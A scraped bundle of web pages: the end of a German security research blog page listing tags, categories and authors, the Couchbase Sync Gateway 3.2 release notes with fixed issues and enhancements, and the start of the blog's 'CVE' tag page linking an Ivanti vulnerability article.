[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from docs.couchbase.com_1e895d81_20250120_231944.html ===


* [![Couchbase](../../_/img/couchbase-logo.svg)](https://www.couchbase.com)
* [![Couchbase Documentation](../../_/img/cb-documentation.svg)
  ![Couchbase Documentation](../../_/img/cb-docs-hover.svg)](https://docs.couchbase.com/home/index.html)

* [Server](../../home/server.html)
* [Mobile](../../home/mobile.html)
* [Capella](../../home/cloud.html)
* [Cloud-Native](../../cloud-native-database/index.html)
* [Couchbase SDKs](../../home/sdk.html)
* [Columnar SDKs](../../home/columnar-sdk.html)

[Downloads](https://www.couchbase.com/downloads)
[Try Free](https://cloud.couchbase.com/sign-up)

Navigation
3.2
3.1
3.0
2.8

* [Edit on GitHub](https://github.com/couchbaselabs/docs-sync-gateway/edit/release/3.2/modules/ROOT/pages/release-notes.adoc "Edit Page")

#### Is this page helpful?

Yes
No

Leave Additional Feedback?

Skip
 Submit

Please use the form below to provide your feedback. Because your feedback is valuable to us,
the information you submit in this form is recorded in our issue tracking system (JIRA), which is publicly available.
You can track the status of your feedback using the ticket number displayed in the dialog once you submit the form.

* [Sync Gateway](index.html)
* Product Notes
* [Release Notes](release-notes.html)

# Release Notes

 +
Quicklinks

[Release 3.1](../3.1/release-notes.html) |
[Release 3.0](../3.0/release-notes.html) |
[Release 2.8](../2.8/release-notes.html) |
[Archived documentation](https://docs-archive.couchbase.com/home/index.html)

> Couchbase Sync Gateway
>
> This content describes the key features and changes implemented by release 3.2.1 of Couchbase Sync Gateway

|  | One Way Upgrade  The migration to 3.x configuration is a ONE WAY process — see: [Upgrading](upgrading.html) for more. |
| --- | --- |

## 3.2.1 — October 2024

### Fixed Issues

* [CBG-4075 - Timeout error will release document sequence as unused](https://jira.issues.couchbase.com/browse/CBG-4075)
* [CBG-4089 - Make config polling more resilient to timeout errors](https://jira.issues.couchbase.com/browse/CBG-4089)
* [CBG-4165 - rotated\_logs\_size\_limit not used by ConsoleLogger’s FileOutput](https://jira.issues.couchbase.com/browse/CBG-4165)
* [CBG-4243 - Default log file permissions changed from 644 to 600](https://jira.issues.couchbase.com/browse/CBG-4243)

### Enhancements

* [CBG-3825 - Memory-based rev cache size](https://jira.issues.couchbase.com/browse/CBG-3825)
* [CBG-4150 - Index optimizations for large number of collections](https://jira.issues.couchbase.com/browse/CBG-4150)
* [CBG-4151 - Memory-based rev cache size tuning](https://jira.issues.couchbase.com/browse/CBG-4151)
* [CBG-4170 - Stat for rev cache current capacity](https://jira.issues.couchbase.com/browse/CBG-4170)
* [CBG-4174 - Force disconnection of blip clients on database close](https://jira.issues.couchbase.com/browse/CBG-4174)
* [CBG-4176 - Improved Auth Failed Logging](https://jira.issues.couchbase.com/browse/CBG-4176)
* [CBG-4190 - Add metrics related to audit logging](https://jira.issues.couchbase.com/browse/CBG-4190)
* [CBG-4196 - Check for context cancellation in buildRevokedFeed if no docs require revocation](https://jira.issues.couchbase.com/browse/CBG-4196)
* [CBG-4201 - Add missing logging for ChangesOptions for Changes requests](https://jira.issues.couchbase.com/browse/CBG-4201)
* [CBG-4294 - Resolve pattern matching for rocky and alma linux to fall into rhel pathways](https://jira.issues.couchbase.com/browse/CBG-4294)

### Known Issues

None for this release.

### Deprecations

None for this release.

|  | For an overview of the latest features offered in Sync Gateway 3.2, see [New in 3.2](whatsnew.html). |
| --- | --- |

## 3.2.0 — September 2024

|  | Do not deploy Eventing/Sync Gateway until all SGW nodes are at version 3.2. For older Sync Gateway versions that do not write import XATTRs, Eventing functions may encounter infinite recursions and duplicate mutations if deployed in a mixed mode SGW environment. This can only happen during a mixed mode of SGW with a 3.2 version and an older version during an upgrade and a new Eventing/Sync Gateway function is deployed. |
| --- | --- |

### Audit Logging for Sync Gateway

Couchbase now provides Audit Logging support for Sync Gateway. Audit Logging provides tools for administrators to track operational irregularities and to support regulatory and security compliance standards.

For more information on new features and enhancements in this release, see [New In 3.2](whatsnew.html).

Version 3.2.0 of Sync Gateway also delivers the following features and enhancements:

### Fixed Issues

* [CBG-2905 - Fixed repeated attempts to connect to inexistent buckets are done after removing a database and bucket](https://jira.issues.couchbase.com/browse/CBG-2905)
* [CBG-2909 - Fixed import still starts when an offline database is created](https://jira.issues.couchbase.com/browse/CBG-2909)
* [CBG-2911 - Fixed /db/ routing does not work with default collection that coexists with named collection](https://jira.issues.couchbase.com/browse/CBG-2911)
* [CBG-2944 - Fixed proveAttachment incompatibility between 3.0.x and 2.8.x](https://jira.issues.couchbase.com/browse/CBG-2944)
* [CBG-2973 - Fixed Panic inside Mutable1xBody for nil shallow copy](https://jira.issues.couchbase.com/browse/CBG-2973)
* [CBG-2983 - Fixed cbgt importlistener leaves open a connection to a bucket after database is deleted](https://jira.issues.couchbase.com/browse/CBG-2983)
* [CBG-2998 - Fixed cbgt cluster connection fails with HTTP polling enabled and TLS disabled](https://jira.issues.couchbase.com/browse/CBG-2998)
* [CBG-3022 - Fixed replicator will not reconnect when max\_back\_off != 0](https://jira.issues.couchbase.com/browse/CBG-3022)
* [CBG-3024 - Fixed CE Import feed starting from vb highseqno instead of zero](https://jira.issues.couchbase.com/browse/CBG-3024)
* [CBG-3043 - Fixed cbgt panics when setting up import feed for server versions < 7.0](https://jira.issues.couchbase.com/browse/CBG-3043)
* [CBG-3102 - Fixed initial OIDC setup fails for keyspace request](https://jira.issues.couchbase.com/browse/CBG-3102)
* [CBG-3195 - Fixed simultaneous role grant + subChanges will cause role grant to not be recognized](https://jira.issues.couchbase.com/browse/CBG-3195)
* [CBG-3196 - Fixed cannot update db config from implicit `_default` scope to explicit `_default` scope](https://jira.issues.couchbase.com/browse/CBG-3196)
* [CBG-3553 - Fixed increasing memory usage when failing to apply a database config from the bucket](https://jira.issues.couchbase.com/browse/CBG-3553)
* [CBG-3688 - Fixed kv\_pool\_size on import feed can be non zero](https://jira.issues.couchbase.com/browse/CBG-3688)
* [CBG-3817 - Fixed collection appears to be linked to 2 DBs after update error](https://jira.issues.couchbase.com/browse/CBG-3817)
* [CBG-3820 - Drop logging volume for pending insertions and doc not found logging](https://jira.issues.couchbase.com/browse/CBG-3820)
* [CBG-3835 - Tweak logging around import of JSON but not JSON object docs](https://jira.issues.couchbase.com/browse/CBG-3835)
* [CBG-3844 - updateSeq must happen after DCP callback invocation](https://jira.issues.couchbase.com/browse/CBG-3844)
* [CBG-3856 - Fixed GET /db RBAC permissions missing for Sync Gateway Architect](https://jira.issues.couchbase.com/browse/CBG-3856)
* [CBG-3867 - Prevent ISGR creation with empty ID](https://jira.issues.couchbase.com/browse/CBG-3867)
* [CBG-3869 - Fixed UnmarshalDocumentSyncDataFromFeed doesn’t return any present user xattrs if sync data doesn’t exist on the doc](https://jira.issues.couchbase.com/browse/CBG-3869)
* [CBG-3882 - Fixed sgcollect\_info fails to upload to s3](https://jira.issues.couchbase.com/browse/CBG-3882)
* [CBG-3883 - Fixed OIDC-auth causes admin\_channels/admin\_roles loss](https://jira.issues.couchbase.com/browse/CBG-3883)
* [CBG-3888 - Fixed sgcollect\_info TypeError when task execution timeout occurs](https://jira.issues.couchbase.com/browse/CBG-3888)
* [CBG-3920 - Fixed not found handling for DCP purge](https://jira.issues.couchbase.com/browse/CBG-3920)
* [CBG-3941 - Avoid timeout on creating indexes asynchronously](https://jira.issues.couchbase.com/browse/CBG-3941)
* [CBG-3950 - Fixed database with default db can see users matching other databases in the bucket](https://jira.issues.couchbase.com/browse/CBG-3950)
* [CBG-3968 - Include scope with collections in resync status](https://jira.issues.couchbase.com/browse/CBG-3968)
* [CBG-3988 - Fixed documents may not be imported when collection added to an existing db](https://jira.issues.couchbase.com/browse/CBG-3988)
* [CBG-3996 - Fixed sgcollect doesn’t work on mac distributions](https://jira.issues.couchbase.com/browse/CBG-3996)
* [CBG-4003 - Fixed DeleteRole doesnt trigger history calculation for named collections](https://jira.issues.couchbase.com/browse/CBG-4003)
* [CBG-4015 - Fixed nextSequenceGreaterThan should update to current \_sync:seq before releasing sequences](https://jira.issues.couchbase.com/browse/CBG-4015)
* [CBG-4025 - Fixed users roles are not getting invalidated after a resync](https://jira.issues.couchbase.com/browse/CBG-4025)
* [CBG-4055 - Fixed incorrect types listed in API docs for all\_docs query parameters](https://jira.issues.couchbase.com/browse/CBG-4055)
* [CBG-4070 - Fixed panic in CheckpointHash function for bucket UUID call](https://jira.issues.couchbase.com/browse/CBG-4070)
* [CBG-4105 - Fixed corrupt DB config handling doesn’t remove the config when longer present in the bucket](https://jira.issues.couchbase.com/browse/CBG-4105)
* [CBG-4106 - Fixed if we error in removeCorruptConfigIfExists we don’t unload/remove database](https://jira.issues.couchbase.com/browse/CBG-4106)
* [CBG-4128 - Decouple client request context from lazy-init OIDC discovery sync process](https://jira.issues.couchbase.com/browse/CBG-4128)
* [CBG-4136 - API Docs: Limit scopes configuration to only one entry](https://jira.issues.couchbase.com/browse/CBG-4136)
* [CBG-4221 - Pending unused sequences shouldn’t update high cache sequence](https://jira.issues.couchbase.com/browse/CBG-4221)
* [CBG-4218 - Fixed duplicated sequences can cause SGW to be unresponsive](https://jira.issues.couchbase.com/browse/CBG-4218)

### Enhancements

* [CBG-2807 - Allow DB Scoped CORS config](https://jira.issues.couchbase.com/browse/CBG-2807)
* [CBG-2837 - Streamline database creation when using many collections](https://jira.issues.couchbase.com/browse/CBG-2837)
* [CBG-2853 - Allow one-shot replications to wait for DCP to catch up on changes feed](https://jira.issues.couchbase.com/browse/CBG-2853)
* [CBG-2895 - Add replication connection limit](https://jira.issues.couchbase.com/browse/CBG-2895)
* [CBG-2898 - Add num\_replications\_rejected\_limit stat for replication connection limit](https://jira.issues.couchbase.com/browse/CBG-2898)
* [CBG-2904 - Retry to insert config when write fails](https://jira.issues.couchbase.com/browse/CBG-2904)
* [CBG-2927 - Add total\_sync\_time stat](https://jira.issues.couchbase.com/browse/CBG-2927)
* [CBG-2929 - Add public\_rest\_bytes\_written stat](https://jira.issues.couchbase.com/browse/CBG-2929)
* [CBG-2932 - Add num\_public\_rest\_requests stat](https://jira.issues.couchbase.com/browse/CBG-2932)
* [CBG-2938 - Suppress OnFeedError logging on database close](https://jira.issues.couchbase.com/browse/CBG-2938)
* [CBG-2977 - Improve handling for deleted collection](https://jira.issues.couchbase.com/browse/CBG-2977)
* [CBG-3101 - Use Scope().Query() for N1QL in cases where CB Server supports it](https://jira.issues.couchbase.com/browse/CBG-3101)
* [CBG-3157 - Improve handling for docs mutated during one-shot replication](https://jira.issues.couchbase.com/browse/CBG-3157)
* [CBG-3163 - Add public\_rest\_bytes\_read stat](https://jira.issues.couchbase.com/browse/CBG-3163)
* [CBG-3520 - Updating import\_filter and sync\_filter to empty string does not work for named collection](https://jira.issues.couchbase.com/browse/CBG-3520)
* [CBG-3537 - Reduce EOF logging from go-blip](https://jira.issues.couchbase.com/browse/CBG-3537)
* [CBG-3563 - Automatic profile collection when exceeding memory thresholds](https://jira.issues.couchbase.com/browse/CBG-3563)
* [CBG-3585 - Log bucket and groupID during config search](https://jira.issues.couchbase.com/browse/CBG-3585)
* [CBG-3613 - docker: switch current working directory to a writeable directory](https://jira.issues.couchbase.com/browse/CBG-3613)
* [CBG-3640 - Change default SG config to use persistent config](https://jira.issues.couchbase.com/browse/CBG-3640)
* [CBG-3696 - Empty user\_xattr\_key doesnt clear db config field](https://jira.issues.couchbase.com/browse/CBG-3696)
* [CBG-3768 - Avoid writing back the document body during import unless required](https://jira.issues.couchbase.com/browse/CBG-3768)
* [CBG-3780 - Additional Platform Support](https://jira.issues.couchbase.com/browse/CBG-3780)
* [CBG-3795 - Deprecate enable\_star\_channel config option](https://jira.issues.couchbase.com/browse/CBG-3795)
* [CBG-3813 - sgcollect windows now collects stderr / stdout](https://jira.issues.couchbase.com/browse/CBG-3813)
* [CBG-3819 - Declare VOLUME in dockerfile](https://jira.issues.couchbase.com/browse/CBG-3819)
* [CBG-3822 - Audit Logging](https://jira.issues.couchbase.com/browse/CBG-3822)
* [CBG-3823 - Warn when releasing a large number of unused sequences](https://jira.issues.couchbase.com/browse/CBG-3823)
* [CBG-3824 - Optimize storage of skipped sequences](https://jira.issues.couchbase.com/browse/CBG-3824)
* [CBG-3837 - Don’t perform per-document logging when processing an unused sequence range](https://jira.issues.couchbase.com/browse/CBG-3837)
* [CBG-3839 - Detect and handle \_sync:seq rollback in sequence allocator](https://jira.issues.couchbase.com/browse/CBG-3839)
* [CBG-3843 - Include collection set in resync status](https://jira.issues.couchbase.com/browse/CBG-3843)
* [CBG-3847 - Log \_sync:seq on database start](https://jira.issues.couchbase.com/browse/CBG-3847)
* [CBG-3849 - Recovery from cas mismatch on metadata documents when using xattrConfig](https://jira.issues.couchbase.com/browse/CBG-3849)
* [CBG-3850 - Optimise releaseUnusedSequenceRange](https://jira.issues.couchbase.com/browse/CBG-3850)
* [CBG-3857 - log DB starting in http status message 503](https://jira.issues.couchbase.com/browse/CBG-3857)
* [CBG-3896 - Compatibility enhancements for eventing source bucket mutations](https://jira.issues.couchbase.com/browse/CBG-3896)
* [CBG-3905 - Logging for GetDatabaseConfigs verbose and ambiguous](https://jira.issues.couchbase.com/browse/CBG-3905)
* [CBG-3925 - Add log rotation interval](https://jira.issues.couchbase.com/browse/CBG-3925)
* [CBG-3938 - sgcollect\_info: Switch to runtime config endpoint to determine logFilePath](https://jira.issues.couchbase.com/browse/CBG-3938)
* [CBG-3942 - Provide bucket and collection when returning an error about inability to create collections](https://jira.issues.couchbase.com/browse/CBG-3942)
* [CBG-3957 - Add a reason for why a database is offline in /\_all\_dbs](https://jira.issues.couchbase.com/browse/CBG-3957)
* [CBG-3960 - Add stats for norev and replacement rev replication messages](https://jira.issues.couchbase.com/browse/CBG-3960)
* [CBG-3962 - Do not regenerate principal seqs unless resync is running on default collection](https://jira.issues.couchbase.com/browse/CBG-3962)
* [CBG-3963 - Check/wait for principal doc index readiness in resync w/ regenerate sequences](https://jira.issues.couchbase.com/browse/CBG-3963)
* [CBG-4013 - Removal of per collection rev cache](https://jira.issues.couchbase.com/browse/CBG-4013)
* [CBG-4019 - Add initialization active property to DbSummary](https://jira.issues.couchbase.com/browse/CBG-4019)
* [CBG-4027 - Failure to perform on-demand import should result in not found/noRev](https://jira.issues.couchbase.com/browse/CBG-4027)
* [CBG-4072 - Uptake gocb enhancement to lower config mismatch logging to debug](https://jira.issues.couchbase.com/browse/CBG-4072)
* [CBG-4074 - update to golang.org/x/crypto:v0.25.0](https://jira.issues.couchbase.com/browse/CBG-4074)
* [CBG-4163 - Log the origin of setting metadata ID when updating a dbconfig](https://jira.issues.couchbase.com/browse/CBG-4163)
* [CBG-4172 - Improve "could not verify JWT" error logging](https://jira.issues.couchbase.com/browse/CBG-4172)

### Known Issues

None for this release.

### Deprecations

* [CBG-3795 - Deprecate enable\_star\_channel config option](https://jira.issues.couchbase.com/browse/CBG-3795)

|  | For an overview of the latest features offered in Sync Gateway 3.2, see [New in 3.2](whatsnew.html). |
| --- | --- |

## Upgrading

For more on upgrading — see: [Upgrading](upgrading.html)

---

#####

## Related Content

######

API Topics

* [Public REST API](rest-api.html)
* [Admin REST API](rest-api-admin.html)
* [Metrics REST API](rest-api-metrics.html)

######

Reference

* [Bootstrap](configuration-schema-bootstrap.html)
* [Database](configuration-schema-database.html)
* [Database Security](configuration-schema-db-security.html)
* [Access Control](configuration-schema-access-control.html)
* [Import Filter](configuration-schema-import-filter.html)
* [Inter-Sync Gateway Replication](configuration-schema-isgr.html)
* [Legacy Pre-3.0 Configuration](configuration-properties-legacy.html)

######

Community

[Mobile Forum](https://forums.couchbase.com/c/mobile/14) |
[Blog](https://blog.couchbase.com/) |
[Blog (Mobile)](https://blog.couchbase.com/category/couchbase-mobile/?ref=blog-menu) |
[Tutorials](https://docs.couchbase.com/tutorials/)

[![Couchbase](../../_/img/couchbase-logo.svg)](https://www.couchbase.com)

* [Documentation](https://docs.couchbase.com)
* [Forums](https://forums.couchbase.com)
* [Support](https://support.couchbase.com)

* [Developer Portal](https://developer.couchbase.com)
* [Blog](https://blog.couchbase.com)
* [Resources](https://www.couchbase.com/resources)

* [Get Started](https://www.couchbase.com/get-started-developing-nosql)
* [Downloads](https://www.couchbase.com/downloads)
* [Training](https://learn.couchbase.com/store?utf8=%E2%9C%93&ss=1&ct=78327&commit=Filter)

* [Twitter](https://twitter.com/couchbase)
* [Linkedin](https://www.linkedin.com/company/couchbase)
* [Facebook](https://www.facebook.com/Couchbase)

Â© 2025
Couchbase and the Couchbase logo are registered trademarks of Couchbase, Inc.
All third party trademarks (including logos and icons) referenced by Couchbase, Inc. remain the property of their respective owners.

[Terms of Use](https://www.couchbase.com/terms-of-use)
[Privacy Policy](https://www.couchbase.com/privacy-policy)
[Cookie Policy](https://www.couchbase.com/cookie-policy)
[Support Policy](https://www.couchbase.com/support-policy)
[Marketing Preference Center](https://info.couchbase.com/unsubscribe-or-manage-preferences.html)

Output
 Close



=== Content from research.hisolutions.com_f4b58258_20250121_012504.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Schlagwort: CVE

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2023/07/eine-10-von-10-ivanti-cve-2023%E2%80%9135078-hilfe-zur-selbsthilfe/ "Eine 10 von 10 – Ivanti CVE-2023‑35078 – Hilfe zur Selbsthilfe")

